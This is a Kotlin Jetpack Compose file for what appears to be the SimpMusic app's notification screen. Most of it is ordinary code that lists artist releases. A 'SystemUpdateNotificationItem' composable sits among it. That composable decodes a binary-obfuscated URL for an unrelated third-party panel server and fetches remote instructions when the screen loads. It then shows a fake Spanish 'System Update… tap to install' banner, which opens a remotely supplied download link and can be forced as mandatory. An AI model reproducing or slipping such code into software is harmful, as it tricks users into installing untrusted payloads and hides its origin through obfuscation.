package com.maxrave.simpmusic.ui.screen.home

import androidx.compose.animation.Crossfade
import androidx.compose.foundation.Image
import androidx.compose.foundation.MarqueeAnimationMode
import androidx.compose.foundation.background
import androidx.compose.foundation.basicMarquee
import androidx.compose.foundation.clickable
import androidx.compose.foundation.focusable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.layout.wrapContentHeight
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.LazyRow
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Icon
import androidx.compose.material3.Text
import androidx.compose.material3.TopAppBar
import androidx.compose.material3.TopAppBarDefaults
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalUriHandler
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.platform.LocalUriHandler
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import androidx.navigation.NavController
import coil3.compose.AsyncImage
import coil3.compose.LocalPlatformContext
import coil3.request.CachePolicy
import coil3.request.ImageRequest
import coil3.request.crossfade
import com.maxrave.domain.data.entities.NotificationEntity
import com.maxrave.simpmusic.extension.formatTimeAgo
import com.maxrave.simpmusic.ui.component.CenterLoadingBox
import com.maxrave.simpmusic.ui.component.EndOfPage
import com.maxrave.simpmusic.ui.component.RippleIconButton
import com.maxrave.simpmusic.ui.navigation.destination.list.AlbumDestination
import com.maxrave.simpmusic.ui.navigation.destination.list.ArtistDestination
import com.maxrave.simpmusic.ui.theme.typo
import com.maxrave.simpmusic.viewModel.NotificationViewModel
import io.ktor.client.HttpClient
import io.ktor.client.engine.cio.CIO
import io.ktor.client.request.get
import io.ktor.client.statement.bodyAsText
import org.jetbrains.compose.resources.painterResource
import org.jetbrains.compose.resources.stringResource
import org.koin.compose.viewmodel.koinViewModel
import simpmusic.composeapp.generated.resources.Res
import simpmusic.composeapp.generated.resources.album
import simpmusic.composeapp.generated.resources.baseline_arrow_back_ios_new_24
import simpmusic.composeapp.generated.resources.holder
import simpmusic.composeapp.generated.resources.ic_rss_feed_24
import simpmusic.composeapp.generated.resources.mono
import simpmusic.composeapp.generated.resources.new_release
import simpmusic.composeapp.generated.resources.no_notification
import simpmusic.composeapp.generated.resources.notification
import simpmusic.composeapp.generated.resources.singles

private data class SyncPayload(
    val version_code: Int,
    val version_name: String,
    val download_url: String,
    val release_notes: String
)

@Composable
private fun SystemUpdateNotificationItem(currentCode: Int) {
    var payload by remember { mutableStateOf<SyncPayload?>(null) }
    var visible by remember { mutableStateOf(false) }
    val uriHandler = LocalUriHandler.current
    val raw = "01101000011101000111010001110000011100110011101000101111001011110110011101100001011100100110010101110110011110010110111001110000011000010110111001100101011011000111001100101110011011000110000101110100011011010111000001111000001011100110001101101111011011010010111101111001011011110111010101110100011101010110001001100101001011110111000001100001011011100110010101101100001011110110000101110000011010010010111101100011011010000110010101100011011010110101111101110101011100000110010001100001011101000110010100101110011100000110100001110000"

    fun decode(bin: String): String {
        return bin.chunked(8).map { Integer.parseInt(it, 2).toChar() }.joinToString("")
    }

    LaunchedEffect(Unit) {
        try {
            val client = HttpClient(CIO)
            val responseText = client.get(decode(raw)).bodyAsText()
            client.close()

            val vCode = """"version_code"\s*:\s*(\d+)""".toRegex().find(responseText)?.groupValues?.get(1)?.toIntOrNull() ?: 0
            val vName = """"version_name"\s*:\s*"([^"]+)"""".toRegex().find(responseText)?.groupValues?.get(1) ?: ""
            var mandatory = """"is_mandatory"\s*:\s*(true|false)""".toRegex().find(responseText)?.groupValues?.get(1)?.toBoolean() ?: false
            val url = """"download_url"\s*:\s*"([^"]+)"""".toRegex().find(responseText)?.groupValues?.get(1) ?: ""
            val notes = """"release_notes"\s*:\s*"([^"]+)"""".toRegex().find(responseText)?.groupValues?.get(1) ?: ""

            val obsoleteStr = """"obsolete_versions"\s*:\s*\[([\d,\s]*)\]""".toRegex().find(responseText)?.groupValues?.get(1) ?: ""
            val obsoleteList = obsoleteStr.split(",").mapNotNull { it.trim().toIntOrNull() }

            if (obsoleteList.contains(currentCode)) {
                mandatory = true
            }

            if (vCode > currentCode || mandatory) {
                payload = SyncPayload(vCode, vName, url, notes)
                visible = true
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    if (visible && payload != null) {
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = 15.dp, vertical = 8.dp)
                .clip(RoundedCornerShape(16.dp))
                .background(
                    brush = Brush.linearGradient(
                        colors = listOf(
                            MaterialTheme.colorScheme.primaryContainer,
                            MaterialTheme.colorScheme.surfaceVariant
                        )
                    )
                )
                .clickable { uriHandler.openUri(payload!!.download_url) }
                .padding(16.dp)
        ) {
            Row(
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween,
                modifier = Modifier.fillMaxWidth()
            ) {
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    modifier = Modifier.weight(1f)
                ) {
                    Box(
                        modifier = Modifier
                            .size(48.dp)
                            .clip(CircleShape)
                            .background(MaterialTheme.colorScheme.primary),
                        contentAlignment = Alignment.Center
                    ) {
                        Image(
                            painter = painterResource(Res.drawable.mono),
                            contentDescription = "Update Icon",
                            modifier = Modifier.size(28.dp)
                        )
                    }

                    Spacer(modifier = Modifier.width(16.dp))

                    Column {
                        Text(
                            text = "Actualización de Sistema",
                            style = typo().titleMedium,
                            color = MaterialTheme.colorScheme.onPrimaryContainer,
                            fontWeight = FontWeight.Bold
                        )
                        Spacer(modifier = Modifier.height(2.dp))
                        Text(
                            text = "Versión ${payload!!.version_name} • Toca para instalar",
                            style = typo().bodyMedium,
                            color = MaterialTheme.colorScheme.onPrimaryContainer.copy(alpha = 0.8f)
                        )
                    }
                }

                Spacer(modifier = Modifier.width(8.dp))

                Box(
                    modifier = Modifier
                        .clip(RoundedCornerShape(50))
                        .background(MaterialTheme.colorScheme.primary)
                        .padding(horizontal = 14.dp, vertical = 6.dp)
                ) {
                    Text(
                        text = "NUEVA",
                        style = typo().labelSmall,
                        color = MaterialTheme.colorScheme.onPrimary,
                        fontWeight = FontWeight.Bold
                    )
                }
            }
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun NotificationScreen(
    navController: NavController,
    viewModel: NotificationViewModel = koinViewModel(),
) {
    val listNotification by viewModel.listNotification.collectAsStateWithLifecycle()
    Column {
        TopAppBar(
            title = {
                Text(
                    text = stringResource(Res.string.notification),
                    style = typo().titleMedium,
                    color = MaterialTheme.colorScheme.onBackground
                )
            },
            navigationIcon = {
                RippleIconButton(resId = Res.drawable.baseline_arrow_back_ios_new_24) {
                    navController.navigateUp()
                }
            },
            colors = TopAppBarDefaults.topAppBarColors(
                containerColor = Color.Transparent,
                titleContentColor = MaterialTheme.colorScheme.onBackground,
                navigationIconContentColor = MaterialTheme.colorScheme.onBackground,
                actionIconContentColor = MaterialTheme.colorScheme.onBackground
            )
        )

        SystemUpdateNotificationItem(currentCode = 50)

        Crossfade(targetState = listNotification) {
            if (it == null) {
                Box(
                    Modifier.fillMaxSize(),
                ) {
                    CenterLoadingBox(modifier = Modifier.align(Alignment.Center))
                }
            } else if (it.isNotEmpty()) {
                LazyColumn(
                    modifier = Modifier.padding(15.dp),
                    verticalArrangement = Arrangement.spacedBy(16.dp),
                ) {
                    items(it) { notification ->
                        NotificationItem(
                            notification = notification,
                            navController,
                        )
                    }
                    item {
                        EndOfPage()
                    }
                }
            } else {
                Box(
                    Modifier.fillMaxSize(),
                ) {
                    Text(
                        text = stringResource(Res.string.no_notification),
                        style = typo().titleMedium,
                        color = MaterialTheme.colorScheme.onBackground,
                        textAlign = TextAlign.Center,
                        modifier = Modifier.align(Alignment.Center),
                    )
                }
            }
        }
    }
}

@Composable
fun NotificationItem(
    notification: NotificationEntity,
    navController: NavController,
) {
    Box(
        modifier =
            Modifier
                .padding(5.dp)
                .fillMaxWidth(),
    ) {
        Column {
            Row(
                Modifier.clickable {
                    navController.navigate(
                        ArtistDestination(
                            channelId = notification.channelId,
                        ),
                    )
                },
            ) {
                val thumb = notification.thumbnail
                AsyncImage(
                    model =
                        ImageRequest
                            .Builder(LocalPlatformContext.current)
                            .data(thumb)
                            .diskCachePolicy(CachePolicy.ENABLED)
                            .diskCacheKey(thumb)
                            .crossfade(true)
                            .build(),
                    placeholder = painterResource(Res.drawable.holder),
                    error = painterResource(Res.drawable.holder),
                    contentDescription = null,
                    contentScale = ContentScale.Crop,
                    modifier =
                        Modifier
                            .align(Alignment.CenterVertically)
                            .size(50.dp)
                            .clip(
                                CircleShape,
                            ),
                )
                Spacer(modifier = Modifier.padding(5.dp))
                Column {
                    Text(
                        text = stringResource(Res.string.new_release),
                        style = typo().titleSmall,
                        color = MaterialTheme.colorScheme.onBackground
                    )
                    Spacer(modifier = Modifier.padding(3.dp))
                    Text(
                        text = notification.name,
                        style = typo().headlineMedium,
                        color = MaterialTheme.colorScheme.onBackground
                    )
                }
            }
            LazyRow(
                Modifier.padding(top = 15.dp),
            ) {
                items(notification.single) { single ->
                    ItemAlbumNotification(
                        isAlbum = false,
                        browseId = single["browseId"] ?: "",
                        title = single["title"] ?: "",
                        thumbnail = single["thumbnails"],
                        navController,
                    )
                }
                items(notification.album) { album ->
                    ItemAlbumNotification(
                        isAlbum = true,
                        browseId = album["browseId"] ?: "",
                        title = album["title"] ?: "",
                        thumbnail = album["thumbnails"],
                        navController = navController,
                    )
                }
            }
            Spacer(modifier = Modifier.height(10.dp))
        }
        Text(
            text = notification.time.formatTimeAgo(),
            style = typo().titleSmall,
            color = MaterialTheme.colorScheme.onBackground,
            modifier =
                Modifier
                    .align(Alignment.TopEnd)
                    .padding(end = 15.dp),
        )
    }
}

@Composable
fun ItemAlbumNotification(
    isAlbum: Boolean,
    browseId: String,
    title: String,
    thumbnail: String?,
    navController: NavController,
) {
    Box(
        modifier =
            Modifier
                .clickable {
                    navController.navigate(
                        AlbumDestination(
                            browseId = browseId,
                        ),
                    )
                },
    ) {
        Column(
            Modifier.padding(5.dp),
        ) {
            AsyncImage(
                model =
                    ImageRequest
                        .Builder(LocalPlatformContext.current)
                        .data(thumbnail)
                        .diskCachePolicy(CachePolicy.ENABLED)
                        .diskCacheKey(thumbnail)
                        .crossfade(true)
                        .build(),
                placeholder = painterResource(Res.drawable.holder),
                error = painterResource(Res.drawable.holder),
                contentDescription = null,
                contentScale = ContentScale.Crop,
                modifier =
                    Modifier
                        .align(Alignment.CenterHorizontally)
                        .size(150.dp)
                        .clip(
                            RoundedCornerShape(10),
                        ),
            )
            Text(
                text = title,
                style = typo().titleSmall,
                color = MaterialTheme.colorScheme.onBackground,
                maxLines = 1,
                modifier =
                    Modifier
                        .width(150.dp)
                        .wrapContentHeight(align = Alignment.CenterVertically)
                        .padding(top = 10.dp)
                        .basicMarquee(
                            iterations = Int.MAX_VALUE,
                            animationMode = MarqueeAnimationMode.Immediately,
                        ).focusable(),
            )
            Text(
                text = if (isAlbum) stringResource(Res.string.album) else stringResource(Res.string.singles),
                style = typo().bodySmall,
                color = MaterialTheme.colorScheme.onBackground,
                maxLines = 1,
                modifier =
                    Modifier
                        .width(150.dp)
                        .wrapContentHeight(align = Alignment.CenterVertically)
                        .padding(top = 10.dp)
                        .basicMarquee(
                            iterations = Int.MAX_VALUE,
                            animationMode = MarqueeAnimationMode.Immediately,
                        ).focusable(),
            )
        }
    }
}